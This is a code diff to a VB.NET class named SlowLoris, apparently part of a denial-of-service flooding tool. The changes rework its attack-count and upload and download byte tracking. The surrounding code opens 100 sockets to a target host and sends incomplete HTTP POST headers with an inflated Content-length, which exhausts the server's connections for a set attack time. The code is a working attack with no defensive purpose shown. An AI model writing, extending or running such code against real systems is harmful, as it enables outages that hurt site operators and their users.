@@ -84,7 +84,20 @@ Public Class SlowLoris
             Dim socketArray As Socket() = New Socket(100 - 1) {}
             Dim span As TimeSpan = TimeSpan.FromSeconds(CDbl(TimetoAttack))
             Dim stopwatch As Stopwatch = Stopwatch.StartNew
+            Dim count As Integer = 0
+            Dim UploadLength As Integer = 0
+            Dim DownloadLength As Integer = 0
             Do While (stopwatch.Elapsed < span)
+                'FloodBase
+                GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + count)
+                GetFloodsBase().SetAttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * UploadLength)
+                GetFloodsBase().SetAttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * DownloadLength)
+                count = 0
+                If Config.Variables.Debug Then
+                    Console.WriteLine("Count: " & GetFloodsBase.Get_AttackCount())
+                End If
+
+                'Worker
                 Try
                     Dim i As Integer
                     For i = 0 To 100 - 1
@@ -97,9 +110,7 @@ Public Class SlowLoris
                         socketArray(i).Connect(Dns.GetHostAddresses(HostToAttack), Port)
                         Dim HttpString = "POST /" & file & " HTTP/1.1" & ChrW(13) & ChrW(10) & "Host: " & HostToAttack.ToString() & ChrW(13) & ChrW(10) & "Content-length: 5235" & ChrW(13) & ChrW(10) & ChrW(13) & ChrW(10)
                         socketArray(i).Send(ASCIIEncoding.Default.GetBytes(HttpString), SocketFlags.None)
-
-                        GetFloodsBase().Set_AttackCount(GetFloodsBase.Get_AttackCount() + 1)
-                        GetFloodsBase().Set_AttackUpStrengOnByte(GetFloodsBase.Get_AttackCount() * HttpString.Length)
+                        UploadLength = HttpString.Length
 
                     Next i
                     Dim j As Integer
@@ -113,7 +124,7 @@ Public Class SlowLoris
                             sb.Append(Encoding.ASCII.GetString(bytesReceived, 0, bytes))
                         Loop Until bytes > 0
 
-                        GetFloodsBase().Set_AttackDownStrengOnByte(GetFloodsBase.Get_AttackCount() * sb.ToString().Length)
+                        DownloadLength = sb.ToString().Length
                         socketArray(j).Close()
                     Next j
                     Continue Do
